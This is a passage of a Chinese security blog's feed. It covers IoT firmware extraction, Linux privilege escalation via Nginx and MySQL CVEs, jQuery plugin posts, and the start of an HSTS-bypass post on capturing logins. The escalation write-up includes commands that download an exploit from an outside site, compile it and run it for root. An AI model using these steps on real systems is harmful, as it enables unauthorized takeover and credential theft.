alt="img"><br><img src="/images/image15.jpg" alt="img"><br><img src="/images/image16.jpg" alt="img"></p><h2 id="ROM芯片"><a href="#ROM芯片" class="headerlink" title="ROM芯片"></a>ROM芯片</h2><p>在对PCB和电子元器件有一定认知后，就可以开始分析其工作原理和芯片了，常见的IOT产品，一般采用嵌入式linux系统开发，对芯片分析主要目的之一就是获取到硬件系统的固件，从固件中分析可能存在的安全风险。<br>固件一般存储在ROM中，ROM是只读存储器（Read-Only Memory）的简称，是一种只能读出事先所存数据的固态半导体存储器。其特性是一旦储存资料就无法再将之改变或删除。通常用在不需经常变更资料的电子或电脑系统中，并且资料不会因为电源关闭而消失。<br>常见的存储芯片按照存储读取方式和制作工艺不同，可以分为： ROM、PROM、EPROM、EEPROM、FLASH-ROM。<br>在大部分IOT产品中多采用flash芯片作为存储器，提取固件主要也是通过读取flash芯片。<br><img src="/images/image17.jpg" alt="img"><br><img src="/images/image18.jpg" alt="img"><br><img src="/images/image19.jpg" alt="img"></p><h2 id="Flash芯片"><a href="#Flash芯片" class="headerlink" title="Flash芯片"></a>Flash芯片</h2><p>FLASH ROM属于真正的单电压芯片，在使用上很类似EEPROM，因此，有些书籍上便把FLASH ROM作为EEPROM的一种。事实上，二者还是有差别的。FLASH ROM在擦除时，也要执行专用的刷新程序，但是在删除资料时，并非以Byte为基本单位，而是以Sector（又称Block）为最小单位，Sector 的大小随厂商的不同而有所不同；只有在写入时，才以Byte为最小单位写入；FLASH ROM芯片的读和写操作都是在单电压下进行，不需跳线，只利用专用程序即可方便地修改其内容；FLASH ROM的存储容量普遍大于EEPROM，约为512K到至8M KBit，由于大批量生产，价格也比较合适，很适合用来存放程序码，近年来已逐渐取代了EEPROM，广泛用于主板的BIOS ROM，也是CIH攻击的主要目标。<br><img src="/images/image20.jpg" alt="img"><br><img src="/images/image21.jpg" alt="img"><br><img src="/images/image22.jpg" alt="img"><br>     根据技术方式不同可分为： IIC EEPROM、SPI NorFlash 、CFI Flash、Parallel NandFlash、SPI NandFlash、eMMC Flash、USF2.0等。<br>      其中SPI NorFlash因为接口简单，使用的引脚少，易于连接，操作方便，并且可以在芯片上直接运行代码，其稳定性出色，传输速率高，在小容量时具有很高的性价比，这使其很适合应于嵌入式系统中作为 FLASH ROM，所以在市场的占用率非常高。<br>      我们通常见到的S25FL128、MX25L1605、W25Q64等型号都是SPI NorFlash，其常见的封装多为SOP8，SOP16，WSON8，US0N8，QFN8、BGA24等。<br><img src="/images/image23.jpg" alt="img"><br><img src="/images/image24.jpg" alt="img"></p><h2 id="芯片印字"><a href="#芯片印字" class="headerlink" title="芯片印字"></a>芯片印字</h2><p>一般PCB上有多块逻辑处理IC，在多个IC芯片中，可以通过分析电路原理和查找芯片印字来确定具体的存储芯片。<br> 芯片上的丝印大多数情况会注明厂商和芯片型号，通过印字可以初步确定芯片类型，同时丝印层的文字也可以帮助我们来确定存储的格式和大小，常见的W25芯片的印字含义如下：<br>       <img src="/images/image25.jpg" alt="img"></p><h2 id="编程器"><a href="#编程器" class="headerlink" title="编程器"></a>编程器</h2><p>读取Flash芯片，需要借助编程器，编程器又称烧录器、写入器、写码器，是专门用来对IC芯片进行读写、编程/烧录的仪器。<br>并口多功能BIOS编程器，它可以对EPROM（27系列芯片）、EEPROM（28系列芯片）、FLASH ROM（29、39、49系列芯片）及单片机、串行芯片等进行读写、编程，是一种性价比较高的编程器。<br>编程器种类多样，从功能简单的专用型到功能全面的全功能通用型都有，价格从几十元到上万元不等。<br><img src="/images/image26.jpg" alt="img"><br><img src="/images/image27.jpg" alt="img"><br><img src="/images/image28.jpg" alt="img"></p><h2 id="串口通信"><a href="#串口通信" class="headerlink" title="串口通信"></a>串口通信</h2><p>串口通信指串口按位（bit）发送和接收字节。尽管比按字节（byte）的并行通信慢，但是串口可以在使用一根线发送数据的同时用另一根线接收数据。在串口通信中，常用的协议包括RS-232、RS-422和RS-485。<br>        RS-232通信方式允许简单连接三线：Tx、Rx和地线。但是对于数据传输，双方必须对数据定时采用使用相同的波特率。<br>        RS-422标准全称是“平衡电压数字接口电路的电气特性”，在RS232后推出，使用TTL差动电平表示逻辑，就是两根的电压差表示逻辑，RS422定义为全双工的，所以最少要4根通信线（一般额外地多一根地线）。<br>        RS485是一个定义平衡数字多点系统中的驱动器和接收器的电气特性的标准，RS-485与RS-422的区别在于RS-485为半双工通信方式，RS-422为全双工方式。RS-422用两对平衡差分信号线分别用于发送和接收，所以采用RS-422接口通信时最少需要4根线。RS-485只用一对平衡差分信号线，不能同时发送和接收，最少只需两根连线。<br><img src="/images/image29.jpg" alt="img"><br><img src="/images/image30.jpg" alt="img"><br><img src="/images/image31.jpg" alt="img"></p><h2 id="UART调试"><a href="#UART调试" class="headerlink" title="UART调试"></a>UART调试</h2><p>通用异步收发传输器（Universal Asynchronous Receiver/Transmitter)，通常称作UART，是一种异步收发传输器，是电脑硬件的一部分。它将要传输的资料在串行通信与并行通信之间加以转换。作为把并行输入信号转成串行输出信号的芯片，UART通常被集成于其他通讯接口的连结上。<br>对于物联网硬件的串口调试，多数情况下指的就是通过UART串口进行数据通讯， 但是我们经常搞不清楚它和COM口的区别,  以及RS232, TTL等关系,             实际上UART、COM指的物理接口形式(硬件), 而TTL、RS-232是指的电平标准(电信号).<br>UART有4个pin（VCC, GND, RX, TX）, 用的TTL电平， 低电平为0(0V)、高电平为1（3.3V或以上），Uart串口的RXD、TXD等一般直接与处理器芯片的引脚相连，而RS232串口的RXD、TXD等一般需要经过电平转换(通常由Max232等芯片进行电平转换)才能接到处理器芯片的引脚上，否则这么高的电压很可能会把芯片烧坏。<br>在调试的时候, 多数情况下我们只引出rx、tx、gnd即可，但是UART的数据要传到电脑上分析就要匹配电脑的接口，通常我们电脑使用接口有COM口和USB口（最终在电脑上是一个虚拟的COM口），但是要想连上这两种接口都要需要进行硬件接口转换和电平转换。<br><img src="/images/image32.jpg" alt="img"><br><img src="/images/image33.jpg" alt="img"></p><h2 id="设备拆解"><a href="#设备拆解" class="headerlink" title="设备拆解"></a>设备拆解</h2><p>对于一台未接触过的机器，拆解首先需要观察其外部结构，是否存在暴露的螺丝孔，如果没有，一般可能隐藏在贴纸或橡胶垫下面，可以用手感受是否存在空洞，部分机器采用卡榫结构，只要找对方向，用一字螺丝刀或撬片，从缝隙中就可以撬开，拆解设备唯一的要诀就是胆大心细。部分常用工具如下：<br><img src="/images/image103.jpg" alt="img"><br><img src="/images/image104.jpg" alt="img"><br>维修组合套装，用来拆装各类螺丝，PCB夹用来拔出排线，手电筒用来观察芯片印字和PCB走线，PCB测试夹用来夹住某些难以焊接的焊点，排线用来连接各类电子设备，热风枪和焊枪用来拆焊和锡焊。</p><h2 id="常见物联网智能设备"><a href="#常见物联网智能设备" class="headerlink" title="常见物联网智能设备"></a>常见物联网智能设备</h2><p><img src="/images/image105.jpg" alt="img"><br>共享充电宝，采用gprs模块配合物联卡与云端通信</p><p><img src="/images/image106.jpg" alt="img"><br>蓝牙挂锁，通过蓝牙芯片与手机配对通信，<br>蓝牙控制电机驱动，使卡锁运转</p><p><img src="/images/image107.jpg" alt="img"><br>共享充电宝，采用GSM模块加蓝牙模块控制通信</p><p><img src="/images/image108.jpg" alt="img"><br>智能锁，WIFI芯片加蓝牙芯片配合控制<br>，外接指纹识别传感器</p><p><img src="/images/image109.jpg" alt="img"><br>智能摄像头，采用WIFI芯片通信，外接音频、视频处理模块</p><p><img src="/images/image110.jpg" alt="img"><br>网络摄像机，采用网卡芯片，配合多口输出输入视频信号模块</p><p><img src="/images/image111.jpg" alt="img"><br>智能路由器，高容量内存搭配智能OS</p><p><img src="/images/image112.jpg" alt="img"><br>智能家居控制终端，高性能WIFI收发中继控制</p><p><img src="/images/image113.jpg" alt="img"><br>智能保险柜，采用WIFI芯片控制加指纹识别传感器</p><p><img src="/images/image114.jpg" alt="img"><br>无线终端，采用4G模块和WIFI芯片，做便携式WIFI终端</p><h2 id="读取芯片"><a href="#读取芯片" class="headerlink" title="读取芯片"></a>读取芯片</h2><p>为了读取Flash芯片的内容，有以下三个基本途径：<br>（1）直接将导线连接到芯片的引脚，在通过导线连接编程器读取固件；<br>（2）把芯片拆下来，在连接编程器读取固件。<br>（3）连接TXD、RXD调试PIN，通过UART串口转接读取固件。<br>根据Flash芯片的封装方式和电路设计不同，需要灵活采用不同的方式。</p><p><img src="/images/image34.jpg" alt="img"><br><img src="/images/image35.jpg" alt="img"></p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p> <a href="http://www.china-cic.cn/" target="_blank" rel="noopener">http://www.china-cic.cn/</a>  中国通信协会相关文献<br>  <a href="https://www.eia.gov/" target="_blank" rel="noopener">https://www.eia.gov/</a>  美国电子工业协会相关标准</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;当我们在分析IOT设备，如智能摄像头、智能门锁、智能路由器等等产品时，采用传统的安全检测手段，如对APP的逆向、云端服务器的渗透测试、产品通
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="硬件安全" scheme="http://yaseng.org/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="硬件分析" scheme="http://yaseng.org/tags/%E7%A1%AC%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Linux 应用权限不当可提权系统漏洞</title>
    <link href="http://yaseng.org/linux-file-permissions-security.html"/>
    <id>http://yaseng.org/linux-file-permissions-security.html</id>
    <published>2016-11-24T09:20:25.000Z</published>
    <updated>2016-11-24T09:30:49.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>linux以强大的文件管理系统著称，在实际使用中，虽然能为工作提供极大便利，然而如果权限处理不当，可能会造成一定的安全风险，如在操作文件时，会改变某些文件夹的权限，当利用一些可以随意穿越的符号链接时，可以使相应文件指向系统文件，越权修改系统文件权限，攻击者利用此原理，劫持so库，或修改启动定时脚本，从而提权。</p><a id="more"></a><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="Nginx-CVE-2016-1247"><a href="#Nginx-CVE-2016-1247" class="headerlink" title="Nginx  CVE-2016-1247"></a>Nginx  CVE-2016-1247</h3><p><strong>影响版本</strong><br>Debian*</p><p><strong>漏洞原理</strong><br>Debian* 默认apt-get 安装的nginx 会把日志目录的所有者设置为  www-data</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yaseng@ubuntu:/tmp$ ls  -ld  /var/<span class="built_in">log</span>/nginx/</span><br><span class="line">drwxr-x--- 2 www-data adm 4096 Nov 21 17:42 /var/<span class="built_in">log</span>/nginx/</span><br></pre></td></tr></table></figure><p>攻击者可以把目录下的日志文件修改为一个符号链接,指向一个没有权限写的文件,例如<br>/etc/ld.so.preload（共享库),当nginx 重启时会修改/etc/ld.so.preload<br>权限为 www-data ,这样就可以劫持环境提权到 root 。<br>nginx 有一个定时脚本(/etc/logrotate.d/nginx）每天 6:25 会重启 ,并且重新设置日志权限 ,只需写一个脚本监听 /etc/ld.so.preload 是否可写然后覆盖一个提权的 so 文件进去即可。<br><strong>漏洞测试</strong><br>环境: Ubuntu 15.04<br>exiloit : <a href="http://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html" target="_blank" rel="noopener">http://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</a><br>安装  sudo apt-get install nginx<br>提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/tmp$ <span class="built_in">pwd</span></span><br><span class="line">/tmp</span><br><span class="line">www-data@ubuntu:/tmp$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@ubuntu:/tmp$ file  4.sh </span><br><span class="line">4.sh: Bourne-Again shell script, ASCII text executable</span><br><span class="line">www-data@ubuntu:/tmp$ ./4.sh  /var/<span class="built_in">log</span>/nginx/error.log</span><br></pre></td></tr></table></figure><p>等待nginx 重启,获取root权限<br><img src="/uploads/2016/11/14799665735069.jpg" alt="">￼</p><p><strong>漏洞修复</strong><br>修改日志权限为 root 。</p><h3 id="MySQL-CVE-2016-6663"><a href="#MySQL-CVE-2016-6663" class="headerlink" title="MySQL  CVE-2016-6663"></a>MySQL  CVE-2016-6663</h3><p><strong>影响版本</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">MariaDB </span><br><span class="line">&lt; 5.5.52</span><br><span class="line">&lt; 10.1.18</span><br><span class="line">   &lt; 10.0.28</span><br><span class="line">MySQL  </span><br><span class="line">&lt;= 5.5.51</span><br><span class="line">&lt;= 5.6.32</span><br><span class="line">&lt;= 5.7.14</span><br><span class="line">Percona Server</span><br><span class="line">&lt; 5.5.51-38.2</span><br><span class="line">&lt; 5.6.32-78-1</span><br><span class="line">&lt; 5.7.14-8</span><br><span class="line">Percona XtraDB Cluster</span><br><span class="line">&lt; 5.6.32-25.17</span><br><span class="line">&lt; 5.7.14-26.17</span><br><span class="line">&lt; 5.5.41-37.0</span><br></pre></td></tr></table></figure><p><strong>漏洞原理</strong><br>MySQL以及其衍生版本在执行修复表( repair table  xxx)业务时会产生一个临时文件 xxx.TMD,赋予 xxx.TMD 一个 mysql  user 权限的SUID,由于MySQL的数据文件夹是可控的,如在赋予权限之前替换掉 TMD 文件(例如 /bin/bash/),就可以获得 mysql-suid 交互式shell 。从web 权限提升到  mysql  user。</p><p><strong>漏洞测试</strong><br>环境: Ubuntu 15.04  Mysql 5.6.28<br>exploit:<a href="http://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c" target="_blank" rel="noopener">http://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c</a></p><p>执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yaseng@ubuntu:/tmp$ sudo apt-get install mysql-server mysql-client</span><br><span class="line">yaseng@ubuntu:/tmp$ sudo   service  mysqld  restart </span><br><span class="line">yaseng@ubuntu:/tmp$ wget http://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c</span><br><span class="line">yaseng@ubuntu:/tmp$ gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient </span><br><span class="line">yaseng@ubuntu:/tmp$ ./mysql-privesc-race <span class="built_in">test</span> <span class="built_in">test</span> localhost <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>截图<br><img src="/uploads/2016/11/14799682334452.jpg" alt="">￼</p><p><strong>漏洞修复</strong><br><a href="https://github.com/mysql/mysql-server/commit/4e5473862e6852b0f3802b0cd0c6fa10b5253291" target="_blank" rel="noopener">https://github.com/mysql/mysql-server/commit/4e5473862e6852b0f3802b0cd0c6fa10b5253291</a></p><h3 id="MySQL-CVE-2016-6664"><a href="#MySQL-CVE-2016-6664" class="headerlink" title="MySQL  CVE-2016-6664"></a>MySQL  CVE-2016-6664</h3><p><strong>影响版本</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">MySQL  </span><br><span class="line">&lt;= 5.5.51</span><br><span class="line">&lt;= 5.6.32</span><br><span class="line">&lt;= 5.7.14</span><br><span class="line"></span><br><span class="line">MariaDB</span><br><span class="line">All current</span><br><span class="line"></span><br><span class="line">Percona Server</span><br><span class="line">&lt; 5.5.51-38.2</span><br><span class="line">&lt; 5.6.32-78-1</span><br><span class="line">&lt; 5.7.14-8</span><br><span class="line"></span><br><span class="line">Percona XtraDB Cluster</span><br><span class="line">&lt; 5.6.32-25.17</span><br><span class="line">&lt; 5.7.14-26.17</span><br><span class="line">&lt; 5.5.41-37.0</span><br></pre></td></tr></table></figure><p><strong>漏洞原理</strong><br>同 nginx 提权相似,MySQL 日志目录/var/log/mysql 权限为 mysql 。当以==mysqld_safe== 启动时。会执行脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">--------[ mysqld_safe ]--------</span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  rm -f <span class="string">"<span class="variable">$pid_file</span>"</span>     <span class="comment"># Some extra safety</span></span><br><span class="line"></span><br><span class="line">  start_time=`date +%M%S`</span><br><span class="line"></span><br><span class="line">  eval_log_error <span class="string">"<span class="variable">$cmd</span>"</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> [ <span class="variable">$want_syslog</span> -eq 0 -a ! -f <span class="string">"<span class="variable">$err_log</span>"</span> ]; <span class="keyword">then</span></span><br><span class="line">    touch <span class="string">"<span class="variable">$err_log</span>"</span>                    <span class="comment"># hypothetical: log was renamed but not</span></span><br><span class="line">    chown <span class="variable">$user</span> <span class="string">"<span class="variable">$err_log</span>"</span>              <span class="comment"># flushed yet. we'd recreate it with</span></span><br><span class="line">    chmod <span class="string">"<span class="variable">$fmode</span>"</span> <span class="string">"<span class="variable">$err_log</span>"</span>           <span class="comment"># wrong owner next time we log, so set</span></span><br><span class="line">  <span class="keyword">fi</span>                                    <span class="comment"># it up correctly while we can!</span></span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">-------------------------------</span><br></pre></td></tr></table></figure><p>当利用CVE-2016-6663 获取到一个mysql  user ,可以直接kill mysqld 从而触发脚本，两个漏洞结合可以从webshell 直接提升到Linux root  。</p><p><strong>漏洞测试</strong><br>环境: Ubuntu 15.04  Mysql 5.6.28<br>exploit:<a href="http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html" target="_blank" rel="noopener">http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html</a></p><p>如图<br><img src="/uploads/2016/11/14799744830723.jpg" alt="">￼</p><p><strong>漏洞修复</strong><br>修改日志权限为 root 。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>可以在源码和脚本中找chmod 关键词发现类似的漏洞,利用符号链接和 so 共享库劫持提权也值得学习。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="http://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html" target="_blank" rel="noopener">http://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</a></li><li><a href="http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html" target="_blank" rel="noopener">http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html</a></li><li><a href="http://legalhackers.com/advisories/Wget-Exploit-ACL-bypass-RaceCond-CVE-2016-7098.html" target="_blank" rel="noopener">http://legalhackers.com/advisories/Wget-Exploit-ACL-bypass-RaceCond-CVE-2016-7098.html</a></li><li><a href="http://xteam.baidu.com/?p=175" target="_blank" rel="noopener">http://xteam.baidu.com/?p=175</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;linux以强大的文件管理系统著称，在实际使用中，虽然能为工作提供极大便利，然而如果权限处理不当，可能会造成一定的安全风险，如在操作文件时，会改变某些文件夹的权限，当利用一些可以随意穿越的符号链接时，可以使相应文件指向系统文件，越权修改系统文件权限，攻击者利用此原理，劫持so库，或修改启动定时脚本，从而提权。&lt;/p&gt;
    
    </summary>
    
      <category term="技术文章" scheme="http://yaseng.org/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>网页弹幕插件 jquery.barrager.js hexo 集成</title>
    <link href="http://yaseng.org/jquery-barrager-js-for-hexo.html"/>
    <id>http://yaseng.org/jquery-barrager-js-for-hexo.html</id>
    <published>2016-04-24T22:44:09.000Z</published>
    <updated>2016-09-01T13:27:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>网页弹幕插件 jquery.barrager.js hexo 集成</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;网页弹幕插件 jquery.barrager.js hexo 集成&lt;/p&gt;

      
    
    </summary>
    
      <category term="Yaseng" scheme="http://yaseng.org/categories/Yaseng/"/>
    
    
      <category term="jquery.barrager.js" scheme="http://yaseng.org/tags/jquery-barrager-js/"/>
    
      <category term="网页弹幕" scheme="http://yaseng.org/tags/%E7%BD%91%E9%A1%B5%E5%BC%B9%E5%B9%95/"/>
    
      <category term="hexo 弹幕" scheme="http://yaseng.org/tags/hexo-%E5%BC%B9%E5%B9%95/"/>
    
      <category term="jQuery 弹幕插件" scheme="http://yaseng.org/tags/jQuery-%E5%BC%B9%E5%B9%95%E6%8F%92%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>网页弹幕插件 jquery.barrager.js WordPress集成</title>
    <link href="http://yaseng.org/jquery-barrager-js-for-wordpress.html"/>
    <id>http://yaseng.org/jquery-barrager-js-for-wordpress.html</id>
    <published>2016-04-24T22:40:31.000Z</published>
    <updated>2016-09-01T13:27:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>jquery.barrager.js WordPress集成</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;jquery.barrager.js WordPress集成&lt;/p&gt;

      
    
    </summary>
    
      <category term="原创作品" scheme="http://yaseng.org/categories/%E5%8E%9F%E5%88%9B%E4%BD%9C%E5%93%81/"/>
    
    
      <category term="jquery.barrager.js" scheme="http://yaseng.org/tags/jquery-barrager-js/"/>
    
      <category term="网页弹幕" scheme="http://yaseng.org/tags/%E7%BD%91%E9%A1%B5%E5%BC%B9%E5%B9%95/"/>
    
      <category term="jQuery 弹幕插件" scheme="http://yaseng.org/tags/jQuery-%E5%BC%B9%E5%B9%95%E6%8F%92%E4%BB%B6/"/>
    
      <category term="WordPress 插件" scheme="http://yaseng.org/tags/WordPress-%E6%8F%92%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>Jquery.barrager.js  1.0 专业的网页弹幕插件</title>
    <link href="http://yaseng.org/jquery-barrager-js-1-0.html"/>
    <id>http://yaseng.org/jquery-barrager-js-1-0.html</id>
    <published>2016-04-24T22:39:15.000Z</published>
    <updated>2016-09-01T13:27:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>名称    jquery.barrager.js<br>版本    1.0<br>项目主页    <a href="http://yaseng.github.io/jquery.barrager.js" target="_blank" rel="noopener">http://yaseng.github.io/jquery.barrager.js</a><br>下载    <a href="https://github.com/yaseng/jquery.barrager.js" target="_blank" rel="noopener">https://github.com/yaseng/jquery.barrager.js</a><br>github    <a href="https://github.com/yaseng/jquery.barrager.js" target="_blank" rel="noopener">https://github.com/yaseng/jquery.barrager.js</a><br>Jquery.barrager.js 是一款优雅的网页弹幕插件、支持显示图片、文字以及超链接。支持速度、高度、颜色、数量等自定义。能轻松集成到论坛,博客等网站中。为网站带来更多的趣味和互动性。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;名称    jquery.barrager.js&lt;br&gt;版本    1.0&lt;br&gt;项目主页    &lt;a href=&quot;http://yaseng.github.io/jquery.barrager.js&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http
      
    
    </summary>
    
      <category term="原创作品" scheme="http://yaseng.org/categories/%E5%8E%9F%E5%88%9B%E4%BD%9C%E5%93%81/"/>
    
    
      <category term="jquery.barrager.js" scheme="http://yaseng.org/tags/jquery-barrager-js/"/>
    
      <category term="网页弹幕" scheme="http://yaseng.org/tags/%E7%BD%91%E9%A1%B5%E5%BC%B9%E5%B9%95/"/>
    
  </entry>
  
  <entry>
    <title>网页弹幕插件 jquery.barrager.js  Discuz 集成</title>
    <link href="http://yaseng.org/jquery-barrager-js-for-discuz.html"/>
    <id>http://yaseng.org/jquery-barrager-js-for-discuz.html</id>
    <published>2016-04-24T22:36:33.000Z</published>
    <updated>2016-09-01T13:27:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>discuz 弹幕插件是一款基于discuz 论坛专业的弹幕插件,使用弹幕显示帖子,回复,指定内容等,为论坛带来更多的趣味和互动性。支持速度、高度、颜色、数量等自定义,兼容各种主流浏览器 。<br>插件地址:  <a href="http://addon.discuz.com/?@uauc_barrager.plugin" title="http://addon.discuz.com/?@uauc_barrager.plugin" target="_blank" rel="noopener">http://addon.discuz.com/?@uauc_barrager.plugin</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;discuz 弹幕插件是一款基于discuz 论坛专业的弹幕插件,使用弹幕显示帖子,回复,指定内容等,为论坛带来更多的趣味和互动性。支持速度、高度、颜色、数量等自定义,兼容各种主流浏览器 。&lt;br&gt;插件地址:  &lt;a href=&quot;http://addon.discuz.co
      
    
    </summary>
    
      <category term="Yaseng" scheme="http://yaseng.org/categories/Yaseng/"/>
    
      <category term="原创作品" scheme="http://yaseng.org/categories/Yaseng/%E5%8E%9F%E5%88%9B%E4%BD%9C%E5%93%81/"/>
    
    
      <category term="discuz 插件" scheme="http://yaseng.org/tags/discuz-%E6%8F%92%E4%BB%B6/"/>
    
      <category term="jquery.barrager.js" scheme="http://yaseng.org/tags/jquery-barrager-js/"/>
    
      <category term="网页弹幕" scheme="http://yaseng.org/tags/%E7%BD%91%E9%A1%B5%E5%BC%B9%E5%B9%95/"/>
    
  </entry>
  
  <entry>
    <title>使用mitmf 来绕过HSTS站点抓取登陆明文</title>
    <link href="http://yaseng.org/hsts-bypass-with-mitmf.html"/>
    <id>http://yaseng.org/hsts-bypass-with-mitmf.html</id>
    <published>2016-04-17T00:15:54.000Z</published>
    <updated>2016-09-01T13:27:52.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="HSTS简介"><a href="#HSTS简介" class="headerlink" title="HSTS简介"></a>HSTS简介</h3><p>HSTS是HTTP Strict Transport Security的缩写，即：”HTTP严格安全传输”。当浏览器第一次访问一个HSTS站点,会跳转到https页面,并种植hsts,下次再访问此站时,只要HSTS 还在有效期中,浏览器就会响应一个 HTTP 307 头,在不经过网络请求直接本地强制http跳转到https。这样可以有效防止基于SSLStrip的中间人攻击,对于伪造的证书，会显示错误，并且不允许用户忽略警告。<br><a id="more"></a><br>一个hsts 站点响应的例子:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  lab  curl  -I   www.taobao.com</span><br><span class="line">HTTP/1.1 302 Found</span><br><span class="line">Server: Tengine</span><br><span class="line">Date: Tue, 12 Apr 2016 06:18:30 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 258</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Location: https://www.taobao.com/</span><br><span class="line">Set-Cookie: thw=cn; Path=/; Domain=.taobao.com; Expires=Wed, 12-Apr-17 06:18:30 GMT;</span><br><span class="line">Strict-Transport-Security: max-age=31536000</span><br></pre></td></tr></table></figure></p><!--more--><h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><h4 id="mitmf-原理"><a href="#mitmf-原理" class="headerlink" title="mitmf 原理"></a>mitmf 原理</h4><p>用户首次访问某网站是不受HSTS保护的。这是因为首次访问时，浏览器还未收到HSTS，此时可以劫持站点绕过hsts 。<br>mitmf 就是利用这个缺陷绕过,当用户首次访问时,通过dns2proxy 伪造出一个具体迷惑性的http站点,例如 访问 www.taobao.com  跳转到 wwww.taobao.com 或者 